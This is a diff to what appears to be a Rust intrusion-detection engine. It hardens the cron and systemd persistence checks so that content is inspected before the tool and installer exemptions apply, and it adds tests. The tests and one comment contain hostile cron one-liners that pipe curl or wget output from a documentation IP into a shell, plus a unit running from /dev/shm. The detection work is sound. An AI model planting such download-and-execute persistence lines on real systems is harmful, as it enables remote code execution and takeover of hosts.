@@ -258,25 +258,39 @@ fn cron_paths(ev: &FileEvent, ctx: &Ctx) -> Option<Finding> {
     if !is_cron {
         return None;
     }
-    // `crontab -e` writes via the crontab binary; anacron updates its own timestamps.
-    if let Some(w) = &ev.writer {
-        if (is_system_tool(&w.comm, &w.exe, &["crontab", "anacron"])
-            || is_user_mgmt_tool(&w.comm, &w.exe))
-            && ctx.tool_exemption_applies(w.pid)
-        {
-            return None;
-        }
-    }
     if ev.path.starts_with("/var/spool/anacron/") {
         return None;
     }
-    if writer_is_installer(ev, ctx) {
-        return None;
+    let system_table = ev.path == "/etc/crontab" || ev.path.starts_with("/etc/cron.d/");
+    let all_commands = cron_commands(ev.content.as_deref().unwrap_or(""), system_table);
+    let suspicious_cmd = all_commands.iter().any(|c| looks_like_staging(c));
+    // Content first: the real `crontab` installs whatever it's fed, so
+    // `(crontab -l; echo '* * * * * curl ...|sh') | crontab -` used to pass
+    // as an ordinary crontab edit. The exemptions only cover clean tables.
+    if !suspicious_cmd {
+        // `crontab -e` writes via the crontab binary; anacron updates its own timestamps.
+        if let Some(w) = &ev.writer {
+            if (is_system_tool(&w.comm, &w.exe, &["crontab", "anacron"])
+                || is_user_mgmt_tool(&w.comm, &w.exe))
+                && ctx.tool_exemption_applies(w.pid)
+            {
+                return None;
+            }
+        }
+        if writer_is_installer(ev, ctx) {
+            return None;
+        }
     }
     let attribution = ctx.attribute(ev);
-    let system_table = ev.path == "/etc/crontab" || ev.path.starts_with("/etc/cron.d/");
-    let commands = cron_commands(ev.content.as_deref().unwrap_or(""), system_table);
-    let suspicious_cmd = commands.iter().any(|c| looks_like_staging(c));
+    // Show the staging lines first, and only a few lines in all.
+    let mut commands: Vec<String> = all_commands
+        .iter()
+        .filter(|c| looks_like_staging(c))
+        .chain(all_commands.iter().filter(|c| !looks_like_staging(c)))
+        .take(MAX_SHOWN_COMMANDS)
+        .cloned()
+        .collect();
+    commands.dedup();
 
     if attribution.is_interactive() && !suspicious_cmd {
         return Some(
@@ -369,9 +383,12 @@ fn cron_commands(content: &str, system_table: bool) -> Vec<String> {
             Some(rest[skip..].join(" "))
         })
         .filter(|c| !c.is_empty())
-        .take(4)
         .collect()
 }
+
+/// Cron commands quoted in an alert. Every line is checked; only the
+/// display is capped (a fifth malicious line used to go unchecked).
+const MAX_SHOWN_COMMANDS: usize = 4;
 
 /// Heuristic for "download and execute" one-liners.
 fn looks_like_staging(cmd: &str) -> bool {
@@ -474,18 +491,9 @@ fn systemd_units(ev: &FileEvent, ctx: &Ctx) -> Option<Finding> {
     if !is_unit && !is_enable_link && !is_dropin {
         return None;
     }
-    if ev.managed_by_package == Some(true) || writer_is_installer(ev, ctx) {
+    if ev.managed_by_package == Some(true) {
         return None;
     }
-    // `systemctl enable` is performed by systemd itself (PID 1) creating the symlink.
-    if is_enable_link {
-        if let Some(w) = &ev.writer {
-            if w.pid == 1 || is_system_tool(&w.comm, &w.exe, &["systemctl", "systemd"]) {
-                return None;
-            }
-        }
-    }
-    let attribution = ctx.attribute(ev);
     let execs = unit_exec_lines(ev.content.as_deref().unwrap_or(""));
     let is_suspicious = |e: &str| {
         e.contains("/tmp/")
@@ -500,6 +508,20 @@ fn systemd_units(ev: &FileEvent, ctx: &Ctx) -> Option<Finding> {
         .or(execs.first())
         .cloned();
     let suspicious_exec = execs.iter().any(|e| is_suspicious(e));
+    // An installer writing a unit that runs from /tmp or pipes curl into a
+    // shell isn't a normal install; only clean units get the exemption.
+    if !suspicious_exec && writer_is_installer(ev, ctx) {
+        return None;
+    }
+    // `systemctl enable` is performed by systemd itself (PID 1) creating the symlink.
+    if is_enable_link {
+        if let Some(w) = &ev.writer {
+            if w.pid == 1 || is_system_tool(&w.comm, &w.exe, &["systemctl", "systemd"]) {
+                return None;
+            }
+        }
+    }
+    let attribution = ctx.attribute(ev);
 
     if attribution.is_interactive() && !suspicious_exec {
         return Some(
@@ -636,6 +658,149 @@ mod tests {
             vec!["/dev/shm/.x --daemon", "/usr/bin/true"]
         );
         assert!(unit_exec_lines("[Service]\nRestart=always\n").is_empty());
+    }
+
+    mod engine_level {
+        use crate::alert::Alert;
+        use crate::baseline::Baseline;
+        use crate::config::Config;
+        use crate::engine::Engine;
+        use crate::events::*;
+        use chrono::{DateTime, Utc};
+
+        fn engine() -> Engine {
+            let cfg = Config::default();
+            let allow = cfg.allowlist.clone();
+            Engine::new(cfg, allow, Baseline::new(false, 24, Utc::now()), "t".into())
+        }
+
+        fn exec(t: DateTime<Utc>, pid: u32, ppid: u32, comm: &str, exe: &str) -> Event {
+            Event::Exec(ExecEvent {
+                ts: t,
+                pid,
+                ppid,
+                uid: 0,
+                gid: 0,
+                comm: comm.into(),
+                exe: exe.into(),
+                argv0: exe.into(),
+                ld_preload: false,
+                deleted_exe: false,
+                tty_nr: 0,
+                container: false,
+                container_id: None,
+            })
+        }
+
+        fn write(t: DateTime<Utc>, path: &str, w: (u32, &str, &str), content: &str) -> Event {
+            Event::File(FileEvent {
+                ts: t,
+                path: path.into(),
+                kind: FileKind::MovedTo,
+                dev: 0,
+                ino: 0,
+                writer: Some(WriterInfo {
+                    pid: w.0,
+                    uid: 0,
+                    comm: w.1.into(),
+                    exe: w.2.into(),
+                    tty_nr: 0,
+                }),
+                session_present: false,
+                is_suid: false,
+                has_file_caps: false,
+                content: Some(content.into()),
+                container: false,
+                managed_by_package: None,
+            })
+        }
+
+        fn d3(a: &[Alert]) -> Option<Severity> {
+            a.iter()
+                .filter(|a| a.detection == DetectionId::D3)
+                .map(|a| a.severity)
+                .max()
+        }
+
+        fn base(eng: &mut Engine, t: DateTime<Utc>) {
+            eng.process(exec(t, 1, 0, "systemd", "/usr/lib/systemd/systemd"));
+            eng.process(exec(t, 400, 1, "cron", "/usr/sbin/cron"));
+            eng.process(exec(t, 401, 400, "sh", "/usr/bin/dash"));
+        }
+
+        #[test]
+        fn real_crontab_installing_a_downloader_is_critical() {
+            let mut eng = engine();
+            let t = Utc::now();
+            base(&mut eng, t);
+            eng.process(exec(t, 402, 401, "crontab", "/usr/bin/crontab"));
+            let a = eng.process(write(
+                t,
+                "/var/spool/cron/crontabs/root",
+                (402, "crontab", "/usr/bin/crontab"),
+                "0 3 * * * /usr/bin/backup\n* * * * * curl -fsSL http://198.51.100.9/k | sh\n",
+            ));
+            assert_eq!(d3(&a), Some(Severity::Critical), "{:?}", a);
+        }
+
+        #[test]
+        fn real_crontab_with_a_clean_table_is_silent() {
+            let mut eng = engine();
+            let t = Utc::now();
+            base(&mut eng, t);
+            eng.process(exec(t, 402, 401, "crontab", "/usr/bin/crontab"));
+            let a = eng.process(write(
+                t,
+                "/var/spool/cron/crontabs/root",
+                (402, "crontab", "/usr/bin/crontab"),
+                "0 3 * * * /usr/bin/backup\n",
+            ));
+            assert_eq!(d3(&a), None, "{:?}", a);
+        }
+
+        #[test]
+        fn fifth_cron_line_is_still_checked() {
+            let mut eng = engine();
+            let t = Utc::now();
+            base(&mut eng, t);
+            let table = "1 * * * * /bin/a\n2 * * * * /bin/b\n3 * * * * /bin/c\n4 * * * * /bin/d\n\
+                         5 * * * * wget -qO- http://198.51.100.9/k | bash\n";
+            let a = eng.process(write(
+                t,
+                "/var/spool/cron/crontabs/root",
+                (401, "sh", "/usr/bin/dash"),
+                table,
+            ));
+            let alert = a
+                .iter()
+                .find(|a| a.detection == DetectionId::D3)
+                .unwrap_or_else(|| panic!("{:?}", a));
+            assert_eq!(alert.severity, Severity::Critical);
+            let runs = alert.facts.iter().find(|f| f.label == "Runs").unwrap();
+            assert!(runs.value.starts_with("wget"), "{}", runs.value);
+        }
+
+        #[test]
+        fn installer_writing_a_tmp_unit_is_critical() {
+            let mut eng = engine();
+            let t = Utc::now();
+            eng.process(exec(t, 1, 0, "systemd", "/usr/lib/systemd/systemd"));
+            eng.process(exec(t, 500, 1, "dpkg", "/usr/bin/dpkg"));
+            let a = eng.process(write(
+                t,
+                "/etc/systemd/system/x.service",
+                (500, "dpkg", "/usr/bin/dpkg"),
+                "[Service]\nExecStart=/dev/shm/.x\n",
+            ));
+            assert_eq!(d3(&a), Some(Severity::Critical), "{:?}", a);
+            let clean = eng.process(write(
+                t,
+                "/etc/systemd/system/y.service",
+                (500, "dpkg", "/usr/bin/dpkg"),
+                "[Service]\nExecStart=/usr/bin/y\n",
+            ));
+            assert_eq!(d3(&clean), None, "{:?}", clean);
+        }
     }
 
     #[test]
